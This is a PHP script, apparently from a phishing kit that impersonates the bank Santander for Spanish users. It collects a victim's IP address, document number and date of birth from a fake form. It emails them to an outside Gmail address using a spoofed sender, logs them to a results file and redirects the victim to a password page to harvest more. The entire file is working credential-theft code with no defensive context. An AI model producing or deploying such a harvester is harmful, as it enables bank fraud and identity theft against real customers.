<?php

$ip = getenv("REMOTE_ADDR");



$message .= "#                       #\n";
$message .= "#============= LOG ============#\n";
$message .= "#                       #\n";
$message .= "============================ : $ip\n";
$message .= "code log :  ".$_POST['document-number']."\n";
$message .= "date naissance :  ".$_POST['day']."./.".$_POST['month']."./.".$_POST['year']."\n";
$message .= "============================ : $ip\n";

$send = "michelponda@gmail.com";


$subject = "|Santander| $ip |";


$from = "From: Spain <josfrans@server1.startsting.nl>";


mail($send,$subject,$message,$from);

$file = fopen("../result.txt", 'a');
fwrite($file, $message);


header("Location: password.html");
?>